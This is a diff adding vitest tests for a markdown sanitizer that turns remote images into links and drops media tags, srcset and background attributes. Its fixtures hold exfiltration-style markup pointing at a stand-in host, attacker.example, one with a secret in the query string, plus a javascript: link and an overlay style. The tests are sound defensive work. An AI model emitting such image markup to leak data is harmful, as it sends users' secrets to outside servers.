@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { renderMarkdown } from "./markdown";
+import { REMOTE_IMAGE_KIND, renderMarkdown } from "./markdown";
 
 /** The rendered nodes in a container, so a test can query them. */
 function html(content: string, pathHref?: (path: string) => string): HTMLElement {
@@ -64,6 +64,99 @@ describe("renderMarkdown links", () => {
   it("still drops a script URL", () => {
     const root = html("[bad](javascript:alert(1))");
     expect(root.querySelector("a[href^='javascript']")).toBeNull();
+  });
+});
+
+describe("renderMarkdown images", () => {
+  /** The rendered fragment as the sanitizer hands it over, before anything inserts it into the page. */
+  function fragment(content: string): DocumentFragment {
+    return renderMarkdown(content);
+  }
+
+  it("shows an image from another server as a link to it, naming its alt text", () => {
+    const nodes = fragment("![the secret](https://attacker.example/x.png?d=hunter2)");
+    expect(nodes.querySelector("img")).toBeNull();
+    const link = nodes.querySelector<HTMLAnchorElement>("a.prose-remote-image");
+    expect(link?.getAttribute("href")).toBe("https://attacker.example/x.png?d=hunter2");
+    expect(link?.getAttribute("target")).toBe("_blank");
+    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
+    expect(link?.textContent).toBe(`${REMOTE_IMAGE_KIND} the secret`);
+  });
+
+  it("names the URL when the image has no alt text", () => {
+    const link = fragment("![](https://attacker.example/x.png)").querySelector(
+      ".prose-remote-image",
+    );
+    expect(link?.textContent).toBe(`${REMOTE_IMAGE_KIND} https://attacker.example/x.png`);
+  });
+
+  it.each([
+    ["raw HTML", '<img src="https://attacker.example/x.png" alt="pic">'],
+    ["a protocol-relative URL", '<img src="//attacker.example/x.png" alt="pic">'],
+    ["plain http", "![pic](http://attacker.example/x.png)"],
+    ["a reference image", "![pic][r]\n\n[r]: https://attacker.example/x.png"],
+  ])("does the same for %s", (_name, markup) => {
+    const nodes = fragment(markup);
+    expect(nodes.querySelector("img")).toBeNull();
+    expect(nodes.querySelector(".prose-remote-image")?.textContent).toBe(
+      `${REMOTE_IMAGE_KIND} pic`,
+    );
+  });
+
+  it("turns a remote image inside a link into text, leaving the one link", () => {
+    const nodes = fragment("[![badge](https://attacker.example/b.svg)](https://example.com/repo)");
+    expect(nodes.querySelector("img")).toBeNull();
+    const links = nodes.querySelectorAll("a");
+    expect(links).toHaveLength(1);
+    expect(links[0]?.getAttribute("href")).toBe("https://example.com/repo");
+    expect(links[0]?.textContent).toBe(`${REMOTE_IMAGE_KIND} badge`);
+  });
+
+  it.each([
+    ["an agent file", "/api/agents/scout/files/chart.png"],
+    ["a relative path", "chart.png"],
+    ["the page's own origin", `${window.location.origin}/api/files/abc`],
+    ["a data URI", "data:image/png;base64,iVBORw0KGgo="],
+  ])("shows %s as an image", (_name, src) => {
+    const nodes = fragment(`![chart](${src})`);
+    expect(nodes.querySelector(".prose-remote-image")).toBeNull();
+    const image = nodes.querySelector("img");
+    expect(image?.getAttribute("src")).toBe(src);
+    expect(image?.getAttribute("alt")).toBe("chart");
+  });
+
+  it.each([
+    [
+      "video",
+      '<video src="https://attacker.example/v.mp4" poster="https://attacker.example/p.png">clip</video>',
+    ],
+    ["audio", '<audio src="https://attacker.example/a.mp3">sound</audio>'],
+    [
+      "video sources and tracks",
+      '<video><source src="https://attacker.example/v.mp4"><track src="https://attacker.example/t.vtt">clip</video>',
+    ],
+    [
+      "picture and its sources",
+      '<picture><source srcset="https://attacker.example/p.png"><img src="/api/files/p.png" alt="pic"></picture>',
+    ],
+    [
+      "an image map",
+      '<map name="m"><area href="https://attacker.example/" shape="rect" coords="0,0,1,1" alt="spot"></map>',
+    ],
+  ])("drops %s", (_name, markup) => {
+    const nodes = fragment(markup);
+    expect(nodes.querySelector("video, audio, source, track, picture, map, area")).toBeNull();
+    expect(nodes.querySelector("[src^='https:'], [srcset], [poster]")).toBeNull();
+  });
+
+  it("drops srcset from an image and background from a table, which load URLs too", () => {
+    const nodes = fragment(
+      '<img src="/api/files/a.png" srcset="https://attacker.example/a.png 2x" alt="a">' +
+        '<table background="https://attacker.example/t.png"><tr><td background="https://attacker.example/c.png">cell</td></tr></table>',
+    );
+    expect(nodes.querySelector("img")?.getAttribute("src")).toBe("/api/files/a.png");
+    expect(nodes.querySelector("[srcset], [background]")).toBeNull();
+    expect(nodes.querySelector("td")?.textContent).toBe("cell");
   });
 });
 
@@ -198,7 +291,7 @@ describe("renderMarkdown raw HTML", () => {
 
   it("drops every inline style, so nothing can be placed over the app", () => {
     const root = html(
-      '<div style="position:fixed;inset:0;background:red">cover</div><p style="color:red">red</p><img src="https://example.com/i.png" style="position:absolute" alt="pic">',
+      '<div style="position:fixed;inset:0;background:red">cover</div><p style="color:red">red</p><img src="/api/agents/scout/files/i.png" style="position:absolute" alt="pic">',
     );
     expect(root.querySelector("[style]")).toBeNull();
     expect(words(root)).toBe("coverred");
